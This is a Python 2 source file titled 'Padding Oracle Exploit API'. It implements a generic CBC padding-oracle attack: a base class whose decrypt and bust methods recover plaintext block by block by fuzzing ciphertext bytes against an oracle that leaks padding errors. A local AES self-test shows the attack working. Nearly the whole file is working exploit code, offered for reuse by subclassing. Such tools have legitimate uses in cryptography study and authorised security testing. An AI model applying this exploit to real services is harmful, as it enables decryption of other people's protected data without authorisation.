# -*- coding: utf-8 -*-
'''
Padding Oracle Exploit API
~~~~~~~~~~~~~~~~~~~~~~~~~~
'''
from itertools import izip, cycle
import logging


class BadPaddingException(Exception):
    '''
    Raised when a blackbox decryptor reveals a padding oracle.

    This Exception type should be raised in :meth:`.PaddingOracle.oracle`.
    '''


class PaddingOracle(object):
    '''
    Implementations should subclass this object and implement
    the :meth:`oracle` method.
    '''

    def __init__(self, **kwargs):
        self.log = logging.getLogger(self.__class__.__name__)
        self.max_retries = int(kwargs.get('max_retries', 3))
        self.attempts = 0
        self.history = []
        self._decrypted = None

    def oracle(self, data):
        '''
        Feeds *data* to a decryption function that reveals a Padding
        Oracle. If a Padding Oracle was revealed, this method
        should raise a :class:`.BadPaddingException`, otherwise this
        method should just return.  A history of all responses should be
        stored in :attribute:`history`, regardless
        of whether they revealed a Padding Oracle or not.  Responses
        from :attribute:`history` are fed to
        :meth:`analyze` to help identify padding oracles.

        :param data: A bytearray of (fuzzed) encrypted bytes.
        :raises: :class:`BadPaddingException` if decryption reveals an
            oracle.
        '''
        raise NotImplementedError

    def analyze(self):
        '''
        This method analyzes return :meth:`oracle` values stored in
        :attribute:`history` and returns the most likely
        candidate(s) that reveals a padding oracle.
        '''
        raise NotImplementedError

    def encrypt(self, plaintext):
        '''
        Encrypts *plaintext* by exploiting a Padding Oracle.
        '''
        raise NotImplementedError

    def decrypt(self, ciphertext, block_size=8, iv=None):
        '''
        Decrypts *ciphertext* by exploiting a Padding Oracle.

        :param ciphertext: Encrypted data.
        :param block_size: Cipher block size (in bytes).
        :param iv: The initialization vector (iv), usually the first
            *block_size* bytes from the ciphertext. If no iv is given
            or iv is None, the first *block_size* bytes will be used.
        :returns: Decrypted data.
        '''
        ciphertext = bytearray(ciphertext)

        self.log.debug('Attempting to decrypt %r bytes', str(ciphertext))

        assert len(ciphertext) % block_size == 0, \
            "Ciphertext not of block size %d" % (block_size, )

        if iv is not None:
            iv, ctext = bytearray(iv), ciphertext
        else:
            iv, ctext = ciphertext[:block_size], ciphertext[block_size:]

        self._decrypted = decrypted = bytearray(len(ctext))

        n = 0
        while ctext:
            block, ctext = ctext[:block_size], ctext[block_size:]

            intermediate_bytes = self.bust(block, block_size=block_size)

            # XOR the intermediate bytes with the the previous block (iv)
            # to get the plaintext

            decrypted[n:n + block_size] = xor(intermediate_bytes, iv)

            self.log.info('Decrypted block %d: %r',
                          n / block_size, str(decrypted[n:n + block_size]))

            # Update the IV to that of the current block to be used in the
            # next round

            iv = block
            n += block_size

        return decrypted

    def bust(self, block, block_size=8):
        '''
        A block buster. This method busts one ciphertext block at a time.
        This method should not be called directly, instead use
        :meth:`decrypt`.

        :param block:
        :param block_size:
        :returns: A bytearray containing the decrypted bytes
        '''
        intermediate_bytes = bytearray()

        test_bytes = bytearray(block_size)  # '\x00\x00\x00\x00...'
        test_bytes.extend(block)

        self.log.debug('Processing block %r', str(block))

        # Work on one byte at a time, starting with the last byte
        # and moving backwards

        for byte_num in reversed(xrange(block_size)):
            retries = 0
            successful = False

            # clear oracle history for each byte

            self.history = []

            # Break on first byte that returns an oracle, otherwise keep
            # trying until we exceed the max retry attempts (default is 3)

            while retries < self.max_retries and not successful:
                for i in reversed(xrange(255)):

                    # Fuzz the test byte

                    test_bytes[byte_num] = i

                    # If a padding oracle could not be identified from the
                    # response, this indicates the padding bytes we sent
                    # were correct.

                    try:
                        self.attempts += 1
                        self.oracle(test_bytes[:])
                    except BadPaddingException:

                        #TODO
                        # if a padding oracle was seen in the response,
                        # do not go any further, try the next byte in the
                        # sequence. If we're in analysis mode, re-raise the
                        # BadPaddingException.

                        if self.analyze is True:
                            raise
                        else:
                            continue

                    except Exception:
                        self.log.exception('Caught unhandled exception!\n'
                                           'Decrypted bytes so far: %r\n'
                                           'Current variables: %r\n',
                                           intermediate_bytes, self.__dict__)
                        raise

                    successful = True

                    current_pad_byte = block_size - byte_num
                    next_pad_byte = block_size - byte_num + 1
                    decrypted_byte = test_bytes[byte_num] ^ current_pad_byte

                    intermediate_bytes.insert(0, decrypted_byte)

                    for k in xrange(byte_num, block_size):

                        # XOR the current test byte with the padding value
                        # for this round to recover the decrypted byte

                        test_bytes[k] ^= current_pad_byte

                        # XOR it again with the padding byte for the
                        # next round

                        test_bytes[k] ^= next_pad_byte

                    break

                if successful:
                    break
                else:
                    retries += 1

            else:
                raise RuntimeError('Could not decrypt byte %d in %r within '
                                   'maximum allotted retries (%d)' % (
                                   byte_num, block, self.max_retries))

        return intermediate_bytes


def xor(data, key):
    '''
    XOR two bytearray objects with each other.
    '''
    return bytearray([x ^ y for x, y in izip(data, cycle(key))])


def test():
    import os
    from M2Crypto.util import pkcs7_pad
    from Crypto.Cipher import AES

    teststring = 'The quick brown fox jumped over the lazy dog'

    class PadBuster(PaddingOracle):
        def oracle(self, ctext):
            cipher = AES.new(key, AES.MODE_CBC, str(bytearray(AES.block_size)))
            ptext = cipher.decrypt(str(ctext))
            plen = ord(ptext[-1])

            padding_is_good = (ptext[-plen:] == chr(plen) * plen)

            if padding_is_good:
                return

            raise BadPaddingException

    padbuster = PadBuster()

    key = os.urandom(AES.block_size)
    cipher = AES.new(key, AES.MODE_CBC, str(bytearray(AES.block_size)))

    data = pkcs7_pad(teststring, blklen=AES.block_size)
    ctext = cipher.encrypt(data)

    iv = bytearray(AES.block_size)
    decrypted = padbuster.decrypt(ctext, block_size=AES.block_size, iv=iv)

    assert decrypted == data, \
        'Decrypted data %r does not match original %r' % (
            decrypted, data)

    print "Data:       %r" % (data, )
    print "Ciphertext: %r" % (ctext, )
    print "Decrypted:  %r" % (str(decrypted), )
    print "\nRecovered in %d attempts" % (padbuster.attempts, )


if __name__ == '__main__':
    test()
